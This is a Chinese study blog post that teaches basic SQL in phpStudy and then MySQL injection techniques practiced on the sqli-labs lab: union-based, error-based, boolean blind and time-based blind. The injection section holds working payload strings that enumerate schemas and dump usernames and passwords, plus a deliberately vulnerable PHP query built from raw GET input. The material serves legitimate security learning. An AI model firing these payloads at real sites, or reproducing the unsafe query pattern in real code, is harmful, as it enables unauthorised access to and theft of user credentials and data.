---
title: 后端学习sql数据库管理、php语言、sql注入
date: 2024-11-22 22:26:52
comments: true
description: 学习记录
categories:
- 后端基础知识
- sql语言
- php语言
tags:
- php
- sql
---

# 后端学习sql数据库管理、php语言、sql注入(持续更新)

---
>参考
>
><https://www.bilibili.com/video/BV16D4y167TT/?spm_id_from=333.880.my_history.page.click>
>
><https://www.runoob.com/sql/sql-tutorial.html>
>
> <https://www.bilibili.com/video/BV1aS4y1W78p?p=2&vd_source=06887b49ed0996e8a27c4d84f89315d3>
>
>https://blog.csdn.net/qq_55316925/article/details/129147618
---

在web方向网络安全的渗透学习中，我发现如果仅仅只是为了做题的需要才去学习碎片的、部分的sql和php语言知识，是不成体系的，对之后的深入学习会造成阻碍

所以，系统地学习基本后端知识迫在眉睫，为之后的深入打好基础

## SQL数据库管理基础入门(基于phpstudy学习)

SQL（Structured Query Language）是一种用于管理和操作关系数据库的标准语言

包括数据查询、数据插入、数据更新、数据删除、数据库结构创建和修改等功能

### 一.使用phpstudy创建数据库并管理

phpstudy中点击软件管理，找到phpMyadmin下载它

下载好后点击数据库，点击创建数据库(不用root数据库)，设置数据库命名用户名密码

回到主页，启动Apache和Mysql，再点击数据库工具，选择phpMyadmin

![](https://www.helloimg.com/i/2024/11/22/6740a0351d80f.png)

之后你的浏览器会自动启动打开你的数据库可视化网站

![](https://www.helloimg.com/i/2024/11/22/6740a06fda84b.png)

在左边的栏点击你刚刚在phpstudy创建的新数据库

PS:传统的数据库的使用(比如在MySQL Workbench上操作)需要先创建数据库

`CREATE DATABASE 数据库名字;`

然后在指定的数据库上操作

`USE 数据库名字;`

### 二.在数据库里创建表格并管理

#### 1.创建表格

在右边的操作面板上方的菜单栏点击SQL，在下方的空白输入SQL语句

![](https://www.helloimg.com/i/2024/11/23/674182e754c32.png)

在这里我创建一个名为"apple1"的表格用来记录每天销售苹果的相关数据

该表格有很多列，每一列的列头需要定义列名和数据类型,以及修改或增加条件使得列具有特殊功能

```sql
CREATE TABLE apple1 (
    id INT AUTO_INCREMENT PRIMARY KEY,
    apple_type VARCHAR(10) NOT NULL,
    sold DATE NULL,
    apple_mass FLOAT
);
```

每一个语句(函数)用分号`;`隔开(大部分语言应该都是如此)

这里的创建表格内部相关内容要用`()`包含起来

在列名的定义中，最后一行不加逗号

`id INT AUTO_INCREMENT PRIMARY KEY,`

定义了每行的序号，是整型类型,后面`AUTO_INCREMENT`条件可以帮我们自动递增序号,不必每次手动输入,`PRIMARY KEY`主键设置,可以给这一列加上特殊的标识

>主键,是数据库表中用于唯一标识每一行记录的一个或一组字段,主键必须满足两个基本条件：
>
>唯一性：每个主键值在表中必须是唯一的，不能有重复值
>
>非空性：主键字段不允许为空（NULL）
>
>作用
>
>它会为被标记的数据创建特殊的索引,若是在表中搜索该类型的数据,可以大大提高搜索效率
>
>在日常生产工作中优化效率


`apple_type VARCHAR(10) NOT NULL,`定义了一列用来存放不同苹果的种类名字，是字符类型,`(10)`规定了表中列的最大长度,NOT NULL意思是该列是不能为空的,如果我们不填入数据直接执行会报错

`sold DATE NULL,`定义了一列存放每种苹果的销售日期,是sql特有的时间类型,NULL意味着该列可以不填入数据空着,没有设置条件的时候默认为空

`apple_mass FLOAT`定义了一列存放每种苹果卖出的总质量，质量经常不是整数，所以这里为浮点型

以上在数据类型后面设置条件并不是必要的,但是事先规定明确好,可以避免之后出现莫名其妙的报错

---

PS：这里列出一些日常管理中常用的数据类型

>数值类型:
>
>INT：广泛用于主键和外键，以及计数器等需要精确整数值的地方。
>
>FLOAT / DOUBLE：适用于需要处理小数点后几位数字的情况，例如财务计算中的金额。
>
>DECIMAL：在需要高精度的计算中使用，如金融交易，以避免浮点数运算带来的舍入误差。
>
>字符串类型：
>
>VARCHAR：非常适合存储长度可变的文本信息，如姓名、地址等。
>
>TEXT：用于存储较长的文本内容，比如文章、评论等。
>
>CHAR：适合存储固定长度的字符串，如电话号码格式化后的存储。
>
>日期和时间类型：
>
>DATETIME：记录事件发生的具体日期和时间，如订单创建时间。
>
>TIMESTAMP：记录事件的时间戳，特别是在需要记录数据更改时间或审计跟踪的情况下。
>
>DATE：仅记录日期，如出生日期。
>
>布尔类型：
>
>BOOLEAN：用于表示是/否、开/关等二元状态的信息，如用户是否激活账户。
>
>枚举类型：
>
>ENUM：当字段只能取有限个已知值时使用，例如性别（男/女）、状态（启用/禁用）等。
>
>二进制类型：
>
>BLOB：存储大型二进制对象，如图片、文档等多媒体文件。
>
>UUID/GUID类型：
>
>UUID：用于生成全局唯一的标识符，特别适用于分布式系统中，避免主键冲突。
>
---

#### 2.填充数据并修改表格

以上直接执行可以成功,但是没有数据,我们需要学会手动传入数据进表格

在上述创建代码后面补上这些

```sql
INSERT INTO study1.apple1 (id,apple_type,sold,apple_mass)
VALUES 
(1,'白苹果','2024-01-01',50.02),
(2,'黑苹果','2024-01-02',48.99),
(DEFAULT,'小苹果',NULL,50.33);
```

`INSERT`插入数据关键字,后面要标明要填充数据的哪个库的哪个表的哪些列

`VALUES`具体数据关键字,后面用`()`包含对应的数据组,`,`隔开,`;`结尾

特殊的字符串类型需要用单引号括起来

![](https://www.helloimg.com/i/2024/11/23/674194a7406a1.png)

假设我们突然需要临时增加一个列,还想更新一些老旧的数据

```sql
ALTER TABLE study1.apple1
ADD favorable_rate FLOAT NULL; --好评率

UPDATE study1.apple1
SET apple_mass = 100.00 --重设数据
WHERE id = 2; --根据前面的主键设定,我们使用WHERE定位具体的重设行
```

![](https://www.helloimg.com/i/2024/11/23/674198b04aa80.png)

某一天我突然喜新厌旧,不想要好评率列和第一行了,删除它们可以这样子

删除行的写法

```sql
DELETE FROM study1.apple1
WHERE id=1;
```

删除列的写法

```sql
ALTER TABLE study1.apple1
DROP favorable_rate;
```

![](https://www.helloimg.com/i/2024/11/23/67419b59091b9.png)

现在我还想删除整个表格

`DROP TABLE study1.apple1`

我已经受不了996的生活了，更进一步，我要删库跑路(doge)

`DROP DATABASE study1`

### 三.数据的查询选择过滤

为了方便练习数据查询，我从网上找了两张表,某段时间全球新冠感染人数的月份表和汇总表

<https://gitee.com/eggtoopain/my-sql-introductory-courseware/blob/master/Egg_database.sql#>

#### 1.查询、选择、过滤

`SELECT * FROM 表格名`从某个表格查询它的全部内容，`*`全选

`SELECT 列名1,列名2 FROM 表格名`从某个表格中只查看某两列的内容

在一列中经常出现某个些数据重复出现的情况，我们想知道有多少种不同的数据，可以使用DISTINCT关键字

`SELECT DISTINCT 列名 FROM 表格`

直接查询数据，我们会发现它们并没有根据序号id去排序，我们需要给它指定一下排序的依据

`SELECT * FROM 表格 ORDER BY 列名 ASC`

`ORDER BY 列名`根据某列进行排序

有ASC(ascending)从低到高和DESC(descending)从高到低两种排序，不设置默认是ASC

这样子查询是没有经过过滤的，信息还是不够精简，使用WHERE进行过滤

这里举一个例子，查询月总表的恢复数大于等于1000000的数据，同时根据Confirmed从高到低排序

```sql
SELECT *
FROM Covid_month
WHERE Recovered >=1000000
ORDER BY Confirmed DESC;
```

![QQ截图20241123175417.png](https://www.helloimg.com/i/2024/11/23/6741a54635d62.png)

事实上，where需要配合一些运算符使用才更好用，这里举一些sql中的运算符

>比较运算符
>
>=
>
> !=或<>
>
> \>
>
> \<
>
> \>=
>
> \<=
>
> BETWEEN 两值之间
>
> IN 一组值里
>
> LIKE 相似匹配
>
>逻辑运算符
>
> AND 与
>
> OR 或
>
> NOT或! 非

现在在上面查询的基础上，我想看低于1000000的数据且不想看到巴西的相关数据，可以这样子写

`WHERE NOT Recovered >=1000000 AND Country != 'Brazil'`

我们可以这样这样子理解这段代码，AND左右两边条件得到的值是布尔值，两边都为真时才输出结果

而NOT写在所有条件前面，对最终得到的布尔值进行取反，得到一个相反的结果

我们如果要查看一个区间内的数据，即数值范围，可以写

`WHERE Recovered BETWEEN 1000000 AND 1500000`

想看字符范围内的数据，比如我只想看巴西和印度这两个国家的数据，可以写

`WHERE Country IN ('Brazil','India')`

记性不太好的理科生，可能记不住某个需要查询的数据的全称，我们可以使用LIKE进行模糊搜索

```sql
WHERE Coutry LIKE `B%` --以B开头的国家
WHERE Coutry LIKE `%a` --以a结尾的国家
WHERE Coutry LIKE `__b%` --第三个字符为b的国家，用_表示未知字符,用%表示一大串未知的字符串
```

### 四.合并表格

有这几种常见的合并方式，INNER JOIN、LEFT JOIN、RIGHT JOIN、FULL OUTER JOIN、UNION

#### 1.INNER JOIN(取交集)

INNER JOIN 的效果是返回两个表中满足连接条件的行。如果某个表中的行在另一个表中没有匹配的行，则该行不会出现在结果集(两表的交集)中

语法

```sql
SELECT columns
FROM table1
INNER JOIN table2
ON table1.column = table2.column; --on关键字查询两表中的相同部分，以此为基准进行column的重组合并
```

输出的时候，结果集的左边是table1的一部分，右边是table2的一部分

这里我们需要创建两个简单的表格以便于学习理解

```sql
CREATE TABLE employees (
    employee_id INT PRIMARY KEY,
    first_name VARCHAR(50),
    last_name VARCHAR(50),
    department_id INT
);

CREATE TABLE departments (
    department_id INT PRIMARY KEY,
    department_name VARCHAR(50)
);

INSERT INTO employees (employee_id, first_name, last_name, department_id) VALUES
(1, '张三', '张', 1),
(2, '李四', '李', 2),
(3, '王五', '王', 1),
(4, '赵六', '赵', NULL); -- 没有分配部门的员工

INSERT INTO departments (department_id, department_name) VALUES
(1, '销售部'),
(2, '技术部'),
(3, '市场部'); -- 没有员工的部门
```

![QQ截图20241124153730.png](https://www.helloimg.com/i/2024/11/24/6742d6ca06336.png)

![QQ截图20241124153739.png](https://www.helloimg.com/i/2024/11/24/6742d6ca11fa9.png)

合并

```sql
SELECT employees.first_name, employees.last_name, departments.department_name
FROM employees
INNER JOIN departments
ON employees.department_id = departments.department_id;
```

![QQ截图20241124153947.png](https://www.helloimg.com/i/2024/11/24/6742d7312a799.png)

结果解释

读取表数据：

-- employees 表中有4行数据

-- departments 表中有3行数据

应用连接条件：

-- 连接条件是 employees.department_id = departments.department_id

生成中间结果集：

-- 中间结果集包含以下行：

--- employee_id = 1的行 和 department_id = 1的行

--- employee_id = 2的行 和 department_id = 2的行

--- employee_id = 3的行 和 department_id = 1的行

我们可以看看中间集是什么样子的

![QQ截图20241124154356.png](https://www.helloimg.com/i/2024/11/24/6742d8328de78.png)

选择输出列：

-- 选择 first_name、last_name 和 department_name 列

返回最终结果：

-- 最终结果集只包含满足连接条件的行

#### 2.LEFT JOIN

语法

```sql
SELECT columns
FROM table1
LEFT JOIN table2
ON table1.column = table2.column;
```

table1从table2的左边连接过去

LEFT JOIN 返回左表中的所有行，以及右表中满足连接条件的行。如果右表中没有匹配的行，则结果集中对应的位置显示为 NULL

在这里我以上面INNER JOIN的代码基础修改以便看出差别

```sql
SELECT employees.first_name, employees.last_name, departments.department_name
FROM employees
LEFT JOIN departments
ON employees.department_id = departments.department_id;
```

![QQ截图20241124155503.png](https://www.helloimg.com/i/2024/11/24/6742dac41effc.png)

很明显，赵六的行被保留下来了，右边没有可以合并的数据直接为NULL

RIGHT UNION的效果跟上类似，不过多赘述

#### 3.FULL OUTER JOIN(取并集)

它不管左右两边有没有对应的数据，直接强行合并，没有的数据就标为NULL

```sql
SELECT *
FROM employees
FULL OUTER JOIN departments
ON employees.department_id = departments.department_id;
```

由于MySQL不支持FULL OUTER JOIN，所以这里没有演示图可以看，但是知道有这样子的操作就行了

#### 4.UNION

上述都是表格的左右拼接，而UNION是两个上下拼接，默认去除完全重复的行

有几个关键特性：

去重：默认情况下，UNION 会去除结果集中重复的行

列数相同：所有 SELECT 语句中的列数必须相同

列类型兼容：所有 SELECT 语句中的对应列的数据类型必须兼容

这里我们再创建两个新的合适的表以便于学习

```sql
CREATE TABLE employees (
    employee_id INT PRIMARY KEY,
    first_name VARCHAR(50),
    last_name VARCHAR(50),
    department_id INT
);

CREATE TABLE managers (
    manager_id INT PRIMARY KEY,
    first_name VARCHAR(50),
    last_name VARCHAR(50),
    department_id INT
);

INSERT INTO employees (employee_id, first_name, last_name, department_id) VALUES
(1, '张三', '张', 1),
(2, '李四', '李', 2),
(3, '王五', '王', 1);

INSERT INTO managers (manager_id, first_name, last_name, department_id) VALUES
(1, '赵六', '赵', 1),
(2, '钱七', '钱', 2);
```

合并

```sql
SELECT *
FROM employees
UNION
SELECT *
FROM managers;
```

![QQ截图20241124161645.png](https://www.helloimg.com/i/2024/11/24/6742dfdf63875.png)

日常中还可以用ORDER进行一下排序以便于查看

## SQL注入

### 一.基础知识

攻击者通过在输入字段中插入恶意的SQL代码，从而操纵数据库查询，获取未经授权的数据或执行未授权的操作。SQL注入通常发生在应用程序没有正确验证和处理用户输入的情况下

按查询字段分类为字符型和数字型

字符型注入包含字符串的拼接，数字型注入特殊数值或逻辑表达式（如 1 OR 1=1），或者数值比较的痕迹

注入方法分为Union注入，报错注入，布尔注入，时间注入

闭合方式，这是sql注入的关键，有`'`,`"`,`")`,其他

手工提交闭合符，结束前一段查询语句，后面可以加入其它语句，查询需要的参数，不要的语句用注释符号`--`,`#`等关掉(通常使用`--+`进行注入，因为`+`会被解析为一个空格，防止`--`直接与后端代码连接导致报错)

### 二.Union注入

UNION注入是一种SQL注入技术，攻击者通过在输入字段中插入恶意的SQL代码，利用 UNION 操作符将多个查询结果合并，从而获取更多的数据或执行未授权的操作。UNION 操作符允许将两个或多个 SELECT 语句的结果集合并成一个结果集

UNION注入的条件和上面UNION合并的使用相同

举例

假设有一个简单的搜索功能，用户可以输入一个产品ID来查找产品信息。后端代码如下：

```php
$product_id = $_GET['product_id'];

$query = "SELECT product_name, price FROM products WHERE product_id = $product_id";
```

攻击者在 product_id 字段中输入 1 UNION SELECT username, password FROM users，查询将变为：

```sql
SELECT product_name, price FROM products WHERE product_id = 1 UNION SELECT username, password FROM users;
```

可能返回

```plaintext
product_name | price
-------------|------
Product A    | 10.99
username1    | password1
username2    | password2
```

#### 1.判断类型

注入

`?id=1 and 1=1 跟?id=1 and 1=2`

都没有报错，说明是字符型，反之数字型

我们还需要去确定后端表单的列数，才能够使用UNION

#### 2.确定表单列数方法

##### (1)使用NULL值

用 NULL 值代替具体的数据，逐步增加列数

在sqllabs的第一关我们可以这样子写(默认是字符型)

`id=1' UNION SELECT NULL --+`

返回The used SELECT statements have a different number of columns

我们再增加一列,两列，三列

```
id=1' UNION SELECT NULL, NULL --+
id=1' UNION SELECT NULL, NULL, NULL --+
```

根据返回结果

```
Your Login name:Dumb
Your Password:Dumb
```

可以确定出列数

##### (2)ORDER BY 或GROUP BY

```
id=1' ORDER BY X --+
id=1' GROUP BY X --+
```

X是未知正整数，从1递增一个个根据返回结果试

#### 3.查询回显位

输入

`id=1' UNION SELECT 1,2,3 --+`

在它后端系统实际呈现的结果集

第一行是它内部表单id=1的一个数据行

第二行就是我们输入的1，2，3排成3列

但是实际网页返回的结果只会取结果集的第一行，导致页面可能不发生改变，我们输入的内容并不会呈现出来

如果不把我们注入进去的结果给返回出来，我们就毫无进展，于是要让结果集第一行的默认数据给去掉，我们可以去查询一个根本不存在的id，它就不会显示占用第一行

`id=-1' UNION SELECT 1,2,3 --+`

这时候可能我们的结果就会有所表示，比如

![QQ截图20241124192755.png](https://www.helloimg.com/i/2024/11/24/67430ca82cd42.png)

我们就会发现输出的只有2，3列，第一列不输出，说明2，3列是回显位

那么之后我们需要在2，3位注入代码才会返回结果

比如我们想知道它后端数据库的名字

`id=-1' UNION SELECT 1,2,database() --+`

![QQ截图20241124193228.png](https://www.helloimg.com/i/2024/11/24/67430dc35d01f.png)

其它可以使用的关键字

>version():查看数据库版本
>
>database():查看使用的数据库
>
>user():查看当前用户
>
>limit:limit子句分批来获取所有数据
>
>group_concat():一次性获取所有的数据库信息,将查询到结果连接起来成一行
>
>information_schema.tables:特殊表单，包含了数据库里所有的表名
>
>information_schema.tables:特殊表单，包含了数据库里所有的列名
>
>table_name:表名
>
>table_schema:数据库名
>
>column_name:字段名

#### 4.UNION爆表

输入

`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+`

将返回security下的所有表单名字，猜测所有账号密码应该在users里面

![](https://img2020.cnblogs.com/blog/2075370/202010/2075370-20201001191039433-1928732598.png)

输入

`?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+`

返回users表单的所有列名id,password,username

输入

`?id=-1' union select 1,2,group_concat(0x5c,username,0x5c,password) from users--+`

其中0x5c是`\`的十六进制表示，以隔开不同数据防止混淆

### 三.报错注入

通过在SQL查询中注入特定的恶意代码，使数据库返回错误信息。这些错误信息通常包含有关数据库结构和内容的详细信息，攻击者可以利用这些信息进一步攻击系统

如果页面没有回显位，无法使用UNION进行输出结果，但是可以报错，那么报错本身就是信息的一个输出，我们可以从报错入手，让系统主动通过报错给我们暴露信息

常见报错注入函数
1. updatexml

语法

UPDATEXML(target_xml, xpath_expression, new_xml)

target_xml：要更新的 XML 文档

xpath_expression：用于指定要更新的节点的 XPath 表达式

new_xml：新的 XML 片段，用于替换指定节点的内容

updatexml(1,1,1) 一共可以接收三个参数，报错位置在第二个参数

使用方法：

`?id=1' and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+`

0x7e为`~`

它的用法跟extractvalue差不多

2. extractvalue

函数本身用法

`EXTRACTVALUE(xml_target, xpath_expression)`

xml_target：要从中提取值的 XML 文档

xpath_expression：用于指定要提取的节点的 XPath 表达式

在报错注入中，通过构造一个无效的 XPath 表达式，使 EXTRACTVALUE 函数触发数据库错误。错误信息中通常会包含有关数据库结构和内容的信息

如果把查询参数路径写错，查不到内容，但不会报错

如果把查询参数格式符号写错，会提示报错

`extractvalue(1,1) 一共可以接收两个参数，报错位置在第二个参数`

使用方法：

`?id=1' and extractvalue(1,concat((select user()))) --+`

3. ST_LatFromGeoHash()

`?id=1' and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))--+`

4. ST_LongFromGeoHash
`?id=1' and ST_LongFromGeoHash(concat(0x7e,(select user()),0x7e))--+`

5. GTID 

1.关于GTID：

GTID是MySQL数据库每次提交事务后生成的一个全局事务标识符，GTID不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的。

2.GTID_SUBSET() 和 GTID_SUBTRACT()函数可以拿来实现报错注入：

函数详解：

GTID_SUBSET() 和 GTID_SUBTRACT() 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错

GTID_SUBSET( set1 , set2 ) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)

GTID_SUBTRACT( set1 , set2 ) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)

```
#GTID_SUBSET函数

gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+
 
#GTID_SUBTRACT函数

gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+
```

6.ST_Pointfromgeohash

`?id=1' and  ST_PointFromGeoHash(version(),1)--+`

7.floor注入

`(select 1 from (select count(*),concat(回显查询位置,floor(rand(0)*2))x from information_schema.tables group by x)a)--+`

### 四.布尔盲注

通过观察应用程序对不同SQL查询的响应来推断数据库的内容。与传统的报错注入不同，布尔盲注不会直接触发数据库错误，而是通过应用程序的逻辑响应（通常是页面内容的变化或HTTP状态码的变化）来判断查询的结果

页面没有回显位，没有报错返回，但是对于错误和正确结果有不同反应，可以试试布尔盲注

需要的函数

ascii()用于返回给定字符的 ASCII 码值

可以构造

`?id=1 and ascii(substr((select database()),1,1))>=100 --+`

得到数据库名字后提取它的第一个字符转换为ascii码与100比较，我们通过不断调整数值(二分法)最终得到具体的码

我们也可以把select database()换成别的我们需要查找的数据，比如看看所有的表单名字

`?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>=100 --+`

这里把group_concat换成limit，从第0行就开始输出，最终控制字符长度为1个

### 五.时间盲注

通过在SQL查询中引入时间延迟函数（如 SLEEP 或 BENCHMARK），观察应用程序的响应时间来推断数据库的内容。与布尔盲注不同，时间盲注不需要应用程序返回具体的错误信息或页面内容变化，而是通过响应时间的变化来判断查询结果

web页面只返回一个正常页面，利用页面响应时间不同，逐个猜解数据

在这种情况下，进行判断类型就应该这样子

`?id=1' and sleep(3) --+`

如果网页过了3秒钟才返回内容，说明闭合符就是`'`，如果马上返回，说明不是，我们要换个闭合符试试看

我们还需要用到if函数

IF(condition, true_value, false_value)

condition：一个布尔表达式，如果为真（非零），则返回 true_value；否则返回 false_value

true_value：当条件为真时返回的值

false_value：当条件为假时返回的值

这时候就可以构造

`?id=1' and if(ascii(substr(select database()),1,1)>100,sleep(0),sleep(3))--+`

跟布尔一样，还是一个个猜字符，只是换了个方式

---

先到这里，sql注入的基础内容算是学完了